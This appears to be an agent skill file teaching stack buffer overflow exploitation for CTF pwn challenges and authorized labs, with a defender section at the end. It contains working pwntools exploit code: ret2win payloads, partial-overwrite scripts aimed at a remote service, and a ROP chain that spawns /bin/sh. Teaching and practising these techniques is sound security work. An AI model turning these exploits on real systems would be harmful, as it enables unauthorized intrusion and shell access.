---
name: ctf-pwn-basics-buffer-overflows
description: Use when exploiting a stack buffer overflow in a CTF pwn
  challenge or an authorized lab binary. Covers finding the crash offset
  with cyclic patterns, overwriting the saved return address, ret2win
  payloads, partial overwrites under PIE, ROP chain basics with pwntools,
  stack alignment fixes, and debugging crashes in gdb. Use when checksec
  shows no canary (or a leaked canary), when gets/strcpy/scanf overflows a
  stack buffer, or when you need to turn a segfault into controlled RIP.
version: 1.0.0
domain: ctf
lifecycle: stable
last_verified: 2026-10-23
parent: ctf-pwn-basics
requires: [ctf-pwn-basics]
extends: []
relates: [pwn-fundamentals, ctf-reversing-basics]
tools:
  - name: pwntools
    version: 4.13
  - name: GDB
    version: 15.2
  - name: ROPgadget
    version: 7.4
  - name: Python
    version: 3.12
---

A stack buffer overflow writes past the end of a local buffer and corrupts
adjacent stack data, including the saved return address. When you control
those bytes, you control where the function returns, which is the foundation
of most CTF pwn exploits. This sub-skill covers the complete authorized
methodology: measuring the exact offset, building ret2win payloads, handling
PIE with partial overwrites, assembling short ROP chains, and fixing the
classic crashes (alignment, bad bytes) that eat CTF time. Scope is CTF
competitions, labs, and explicitly authorized targets only.

## Quick Workflow

1. Confirm the overflow: feed a long input (`python3 -c "print('A'*500)"`)
   and check for `Segmentation fault`.
2. Generate a cyclic pattern of sufficient length and crash the program
   with it under gdb.
3. Read the faulting register value and run it through `cyclic_find` to
   get the exact offset to the saved return address.
4. Check what you control: which registers or stack slots hold pattern
   bytes, and whether any bytes are filtered.
5. Pick the target: `win()` address for ret2win, or the first ROP gadget
   for a chain.
6. Build the payload with pwntools `flat()` and test locally until the
   program jumps where you want.
7. Fix alignment (`ret` gadget before libc calls on x86-64) and re-test
   with several runs to rule out flakiness.
8. Point the same script at the remote service and capture the flag.

## 1. Offset discovery with cyclic patterns

The cyclic (De Bruijn) pattern guarantees every 4 or 8 byte window is
unique, so the crash value tells you the exact offset.

```bash
# Create a 300 byte pattern file
python3 -c "from pwn import *; open('/tmp/pat','wb').write(cyclic(300))"

# Crash it under gdb and read RIP
gdb -q -ex 'run < /tmp/pat' -ex 'info registers rip' --args ./vuln
# example: rip  0x6161616b6261616a

# Convert the crash value back to an offset
python3 -c "from pwn import *; print(cyclic_find(0x6161616b6261616a))"
# 120
```

Note the endianness: on little-endian x86-64, the bytes in RIP appear
reversed relative to the pattern, but `cyclic_find` handles the integer
directly. If the program reads with `fgets` instead of `gets`, the newline
counts as a byte; account for it in the offset.

## 2. ret2win: the minimal working exploit

When the binary has a function that prints the flag (or spawns a shell),
overwrite the return address with its address.

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
OFFSET = 120

payload = flat(
    b"A" * OFFSET,          # fill buffer + saved rbp
    elf.symbols["win"],     # overwrite saved return address
)

io = process("./vuln")
io.sendline(payload)
print(io.recvall(timeout=2).decode(errors="ignore"))
```

If `win` takes an argument (e.g. `win(0xdeadbeef)`), prepend a `pop rdi;
ret` gadget:

```python
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
payload = flat(b"A" * OFFSET, POP_RDI, 0xdeadbeef, elf.symbols["win"])
```

Verify with `checksec`: this path needs no canary and either no PIE or a
known binary base.

## 3. Partial overwrites under PIE

PIE randomizes the binary base, but ASLR on 64-bit Linux typically leaves
the low 12 bits (one page) unrandomized, and brute forcing one byte is only
256 tries. If the target address shares high bytes with the original return
address, overwrite just the low bytes.

```python
# Example: original return lands in main+0x2a; win is at main-0x30.
# Overwrite only the low 2 bytes to redirect within the same page region.
io = remote("chals.ctf", 31337)
io.recvuntil(b"input: ")
# leak a stack address or code pointer first if the program prints one
payload = b"A" * OFFSET + p16(0x1196)   # low 2 bytes of win, high bytes kept
io.send(payload)
```

Partial overwrites also defeat brute-force-resistant setups when combined
with a single leaked byte. Always confirm which bytes are actually
randomized on the target: run the binary twice locally and diff two leaked
pointers.

## 4. Short ROP chains and stack alignment

When there is no `win` function, chain gadgets to call `system` or set up
`execve`. Keep chains short for bounded overflows.

```bash
# List usable gadgets
ROPgadget --binary ./vuln | grep -E "pop rdi|pop rsi|pop rdx|ret" | head -20
```

```python
from pwn import *
elf = ELF("./vuln")
rop = ROP(elf)

# execve("/bin/sh", 0, 0) chain skeleton (needs /bin/sh string in binary)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
POP_RSI = rop.find_gadget(["pop rsi", "ret"])[0]
POP_RDX = rop.find_gadget(["pop rdx", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]
BINSH   = next(elf.search(b"/bin/sh"))

payload = flat(
    b"A" * OFFSET,
    RET,                       # 16-byte stack alignment for libc calls
    POP_RDI, BINSH,
    POP_RSI, 0,
    POP_RDX, 0,
    elf.plt["execve"] if "execve" in elf.plt else elf.symbols["execve"],
)
```

The `RET` gadget before the first real call fixes the `movaps`
segfault: on x86-64 the stack must be 16-byte aligned at a `call`
instruction, and the overflow path usually leaves it misaligned by 8.

## 5. Debugging the crash in gdb

When the exploit crashes instead of working, inspect the exact state.

```bash
gdb -q ./vuln
(gdb) run < /tmp/payload.bin
# Program received signal SIGSEGV, Segmentation fault.
(gdb) info registers rip rsp
(gdb) x/16gx $rsp        # what does the stack look like at crash?
(gdb) x/i $rip           # what instruction faulted?
(gdb) vmmap              # which regions are executable? (needs pwndbg/gef)
```

Common findings and fixes: RIP points to `0x0` (offset wrong or null byte
truncated the payload), RIP is a stack address with NX on (need ret2libc,
not shellcode), crash inside `system` on `movaps` (add `ret` gadget),
payload contains `0x0a` (newline terminates `gets`/`scanf` input early,
rebuild avoiding that byte).

## Edge cases

- `fgets(buf, 64, stdin)` keeps the trailing newline: your offset math
  must include it, and the newline can shift gadget addresses by one.
- `scanf("%s")` stops at whitespace: build payloads with no spaces, or
  switch to a different input function if the challenge offers one.
- Null bytes (`0x00`) in addresses truncate C string functions: use
  partial overwrites, find gadgets at null-free addresses, or pivot to a
  technique that does not pass through `strcpy`.
- The buffer is on the heap, not the stack: this is a heap overflow, a
  different bug class; overwriting a saved return address will not work.
- Multiple overflows in one program: overflow the first to leak, the
  second to exploit; pwntools `io.sendline` sequencing handles this.
- The program checks input length but the check is wrong (off-by-one):
  a single null byte overflow can still corrupt the saved frame pointer
  enough to pivot the stack.

## Escalation

- Offset found but RIP is not controlled: check for a canary
  (`checksec` again), or the overflow may stop at a different saved
  register; look at which register holds pattern bytes.
- ret2win works locally but not remotely: PIE may be enabled remotely
  only in some challenges; verify with a second run, or the remote
  binary version differs, so re-download it from the challenge page.
- Gadget addresses contain bad bytes: search ROPgadget output for
  alternatives (`pop rdi` exists in many places); use `rop.find_gadget`
  across the binary and its linked libraries.
- Chain is too long for the buffer: split into two stages (first stage
  calls `read` to load a longer second stage onto the stack), or use a
  stack pivot gadget (`leave; ret`) to move `rsp` to a bigger buffer.
- `system` is not in the PLT: leak libc and use `libc.symbols["system"]`,
  or use a one_gadget if its constraints are satisfiable.

## Detection and defender view

Defenders detect buffer overflow exploitation through crash telemetry:
repeated SIGSEGV from the same service, inputs containing long runs of
`A` or cyclic-looking data, and post-crash shells spawned by network
services. Compile-time defenses (stack canaries, FORTIFY_SOURCE, `-D_FORTIFY`)
turn exploitation into a crash; runtime defenses (NX, PIE, ASLR) force
attackers into longer, noisier chains. The durable fix is memory-safe
input handling: bounded copies (`fgets`, `snprintf`, `memcpy` with checked
lengths), plus fuzzing in CI so the overflow is found before release.

## Key references

- MITRE ATT&CK T1068 (Exploitation for Privilege Escalation).
- CWE-121 (Stack-based Buffer Overflow).
- CWE-787 (Out-of-bounds Write).
- CWE-120 (Buffer Copy without Checking Size of Input).
- pwntools `cyclic` and `flat` docs: https://docs.pwntools.com/
- ROPgadget usage: https://github.com/JonathanSalwan/ROPgadget
